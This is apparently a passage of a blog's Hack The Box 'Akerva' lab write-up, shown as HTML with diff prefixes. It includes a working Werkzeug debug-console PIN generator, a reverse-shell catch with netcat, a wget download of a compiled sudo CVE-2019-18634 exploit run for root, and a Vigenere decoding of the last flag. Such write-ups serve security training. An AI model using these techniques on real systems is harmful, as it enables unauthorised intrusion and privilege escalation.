+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s">'aas'</span><span class="p">,</span><span class="c1"># username
+</span>        <span class="s">'flask.app'</span><span class="p">,</span><span class="c1"># modname
+</span>        <span class="s">'Flask'</span><span class="p">,</span><span class="c1"># getattr(app, '__name__', getattr(app.__class__, '__name__'))
+</span>        <span class="s">'/usr/local/lib/python2.7/dist-packages/flask/app.pyc'</span> <span class="c1"># getattr(mod, '__file__', None),
+</span><span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s">'345052382265'</span><span class="p">,</span> <span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address
+</span>        <span class="s">'258f132cd7e647caaf5510e3aca997c1'</span> <span class="c1"># get_machine_id(), /etc/machine-id
+</span><span class="p">]</span>
+
+<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+                <span class="k">continue</span>
+        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+                <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+        <span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+<span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="s">b'cookiesalt'</span><span class="p">)</span>
+<span class="c1">#h.update(b'shittysalt')
+</span>
+<span class="n">cookie_name</span> <span class="o">=</span> <span class="s">'__wzd'</span> <span class="o">+</span> <span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+
+<span class="n">num</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="s">b'pinsalt'</span><span class="p">)</span>
+        <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s">'%09d'</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+
+<span class="n">rv</span> <span class="o">=</span><span class="bp">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                        <span class="n">rv</span> <span class="o">=</span> <span class="s">'-'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">].</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
+                                                  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+                        <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</pre></table></code></div></div><blockquote><p>Running script</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>➜  console-exploit python exploit.py                                            
+280-459-859
+</pre></table></code></div></div><p>And after entering the pin i am in the <code class="language-plaintext highlighter-rouge">interactive-console</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-15.png" alt="console" /></p><h2 id="shell-as-aas">shell as aas</h2><p>Since i can run any python code from here now… It i will be better if i just spawn a rev shell</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-16.png" alt="console" /></p><p>as soon as i run that code i got reverse shell on my netcat listener</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>➜  akerva rlwrap nc <span class="nt">-nlvp</span> 1234
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.13.37.11.
+Ncat: Connection from 10.13.37.11:42172.
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$
+</span></pre></table></code></div></div><p>And if i do a ls with <code class="language-plaintext highlighter-rouge">-a</code> i can see a hidden file or a hidden flag</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 28
+drwxr-xr-x 3 aas  aas  4096 Feb  9 01:42 <span class="nb">.</span>
+drwxr-xr-x 3 root root 4096 Feb  9 01:39 ..
+<span class="nt">-rw-------</span> 1 root root    0 Dec  7  2019 .bash_history
+<span class="nt">-rw-r--r--</span> 1 aas  aas   220 Apr  4  2018 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 aas  aas  3771 Apr  4  2018 .bashrc
+<span class="nt">-r--------</span> 1 aas  aas    21 Feb  9 01:17 flag.txt
+<span class="nt">-rw-r--r--</span> 1 root root   38 Feb  9 01:22 .hiddenflag.txt
+dr-xr-x--- 2 aas  aas  4096 Feb 10 10:49 .ssh
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> .hiddenflag.txt
+AKERVA<span class="o">{</span><span class="c">#6 - Flag}</span>
+</pre></table></code></div></div><h1 id="7---flag">#7 - Flag</h1><p>After some enum when i didnt find anything…I just did a <code class="language-plaintext highlighter-rouge">sudo --version</code> and found what i need further</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">--version</span>
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+</pre></table></code></div></div><p>And found a <code class="language-plaintext highlighter-rouge">poc</code> on github for this version</p><blockquote><p><a href="https://github.com/saleemrashid/sudo-cve-2019-18634/" target="_blank">https://github.com/saleemrashid/sudo-cve-2019-18634/</a></p></blockquote><p>I need to compile that <code class="language-plaintext highlighter-rouge">exploit.c</code> and send it to the target machine and run it</p><blockquote><p>Compiling</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>➜  sudo-cve-2019-18634 git:<span class="o">(</span>master<span class="o">)</span> ✗ gcc <span class="nt">-o</span> <span class="nb">sudo </span>exploit.c
+➜  sudo-cve-2019-18634 git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+</pre></table></code></div></div><p>Now send it to machine via <strong>wget</strong> and python <strong>server</strong></p><blockquote><p>Uploading</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>wget http://10.13.14.7/sudo
+<span class="nt">--2020-06-19</span> 09:28:53--  http://10.13.14.7/sudo
+Connecting to 10.13.14.7:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 17480 <span class="o">(</span>17K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: ‘sudo’
+
+     0K .......... .......                                    100% 49.4K<span class="o">=</span>0.3s
+
+2020-06-19 09:28:55 <span class="o">(</span>49.4 KB/s<span class="o">)</span> - ‘sudo’ saved <span class="o">[</span>17480/17480]
+
+<span class="err">$</span>
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>➜  sudo-cve-2019-18634 git:<span class="o">(</span>master<span class="o">)</span> ✗ python <span class="nt">-m</span> SimpleHTTPServer 80    
+Serving HTTP on 0.0.0.0 port 80 ...
+10.13.37.11 - - <span class="o">[</span>19/Jun/2020 05:11:32] <span class="s2">"GET /sudo HTTP/1.1"</span> 
+</pre></table></code></div></div><p>Now just need to run it..nothing else</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">chmod</span> +x <span class="nb">sudo</span>
+<span class="nv">$ </span>./sudo
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>aas: 
+Harm can come to a young lad like that!
+<span class="nb">whoami
+</span>root
+python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+root@Leakage:/tmp# 
+</pre></table></code></div></div><p>And we pwned it….time for 7th flag</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>root@Leakage:/root# <span class="nb">cat </span>flag.txt
+<span class="nb">cat </span>flag.txt
+AKERVA<span class="o">{</span><span class="c">#7 - Flag}</span>
+</pre></table></code></div></div><h1 id="8--flag">#8 -Flag</h1><p>I got a <code class="language-plaintext highlighter-rouge">secured_note.md</code> here</p><blockquote><p>secured_note.md</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNL
+UkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVM
+U1BNSUhITU9EQVVLSEUK
+
+@AKERVA_FR | @lydericlefebvre
+</pre></table></code></div></div><p>Its a <code class="language-plaintext highlighter-rouge">base64</code> text</p><blockquote><p>Deconding b64</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>➜  akerva <span class="nb">echo</span> <span class="s2">"R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNL
+UkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVM
+U1BNSUhITU9EQVVLSEUK"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
+</pre></table></code></div></div><h2 id="vigenere-cipher">Vigenere cipher</h2><p>Its been decoded and the result text is <code class="language-plaintext highlighter-rouge">vigenere cipher</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-17.png" alt="vigenere" /></p><p>So i know what the cipher is now</p><p>i will be using the <code class="language-plaintext highlighter-rouge">Plain text method</code> to decode the cipher , in this thing i will be needed a <strong>plain-text</strong> value from the encoded string</p><p>As i know that there will be a flag in this string and the flag format is <code class="language-plaintext highlighter-rouge">AKERVA{flag}</code> so i can simply guess that the plaintext value that is present in the string is <strong>AKERVA</strong></p><blockquote><p>Decoding</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-18.png" alt="vigenere" /></p><p>But lol…i cant even understand anything</p><p>Than i thought that is there all the 26 <code class="language-plaintext highlighter-rouge">alphabets</code> present in it or not ?</p><p>I made a python script to check what chars are missing from the string</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">string</span>
+<span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">char</span><span class="p">):</span>
+	<span class="n">s</span> <span class="o">=</span> <span class="s">"GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE"</span> 
+	<span class="k">if</span><span class="p">(</span><span class="n">char</span><span class="p">.</span><span class="n">upper</span><span class="p">()</span> <span class="ow">in</span> <span class="n">s</span><span class="p">):</span>
+		<span class="k">pass</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="k">print</span> <span class="n">char</span><span class="p">.</span><span class="n">upper</span><span class="p">()</span>
+
+<span class="n">alphabets</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyz"</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">alphabets</span><span class="p">:</span>
+	<span class="n">check</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</pre></table></code></div></div><blockquote><p>Running script</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>➜  akerva python check.py
+B
+J
+Q
+X
+Z
+</pre></table></code></div></div><p>And as i <strong>thought</strong> that some <code class="language-plaintext highlighter-rouge">chars</code> are missing and yes they are</p><p>The aphabet order will be now</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>ACDEFGHIKLMNOPRSTUVWY
+</pre></table></code></div></div><p>Now decoding again with these alphabets</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-19.png" alt="vigenere" /></p><p>And now this time i got the key as <code class="language-plaintext highlighter-rouge">ILOVESPACE</code></p><p>And the string that got decoded , i can read it very simply</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>WELLRONEFORSOLLINGTHISCHOLLENGEYOUPANSENDYOUGRESUMEHERSATRECRUTECENTAKERVAPOMANDVALIRATETHELASIFLAGWITHAKERVAIKNOOEWVIGEEENEGRRE
+</pre></table></code></div></div><p>and if we read carefully the flag is infront of us</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>AKERVAIKNOOEWVIGEEENEGRRE
+</pre></table></code></div></div><p>And thats how i completed this <code class="language-plaintext highlighter-rouge">fortress</code></p><h1 id="donations">Donations</h1><p><strong>If u like My Content.Support a Poor Student who is collecting money to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> <a href="https://0xprashant.github.io/tabs/donation/" target="_blank">Donation for OSCP</a></strong></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>About werkzeug<td><a href="https://werkzeug.palletsprojects.com/en/1.0.x/debug/" target="_blank">https://werkzeug.palletsprojects.com/en/1.0.x/debug/</a><tr><td>Cracking the console pin<td><a href="https://www.daehee.com/werkzeug-console-pin-exploit/" target="_blank">https://www.daehee.com/werkzeug-console-pin-exploit/</a><tr><td>Sudo exploit poc<td><a href="https://github.com/saleemrashid/sudo-cve-2019-18634/" target="_blank">https://github.com/saleemrashid/sudo-cve-2019-18634/</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/active/'>active</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/snmpwalk/" class="post-tag no-text-decoration" >snmpwalk</a> <a href="/tags/wfuzz/" class="post-tag no-text-decoration" >wfuzz</a> <a href="/tags/werkzeug-console/" class="post-tag no-text-decoration" >Werkzeug Console</a> <a href="/tags/sudo-vulnerability/" class="post-tag no-text-decoration" >sudo-vulnerability</a> <a href="/tags/vigenere-cipher/" class="post-tag no-text-decoration" >vigenere cipher</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Fortress Akerva writeup - 0xPrashant&url=http://localhost:4000/posts/htb-akerva/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Fortress Akerva writeup - 0xPrashant&u=http://localhost:4000/posts/htb-akerva/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Fortress Akerva writeup - 0xPrashant&url=http://localhost:4000/posts/htb-akerva/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-blunder/"><div class="card-body"> <span class="timeago small" > May 30 <i class="unloaded">2020-05-30T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blunder writeup</h3><div class="text-muted small"><p> Introduction@Blunder:~$ Column Details Name Blunder IP 10.10.10.191 Points 20 Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-obsecurity/"><div class="card-body"> <span class="timeago small" > May 9 <i class="unloaded">2020-05-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox obscurity writeup</h3><div class="text-muted small"><p> information@obscurity:~$ Column Details Name obscurity IP 10.10.10.168 Points 30 Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-cache/"><div class="card-body"> <span class="timeago small" > May 10 <i class="unloaded">2020-05-10T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Cache writeup</h3><div class="text-muted small"><p> I got the root flag first becasue i was able to pwn root wihout getting ash user credentials Introduction@cache:~$ Column Details Name Cache ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-blackfield/" class="btn btn-outline-primary"><p>Hackthebox Blackfield writeup</p></a> <a href="/posts/htb-fuse/" class="btn btn-outline-primary"><p>Hackthebox Fuse writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-akerva/'; this.page.identifier = '/posts/htb-akerva/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
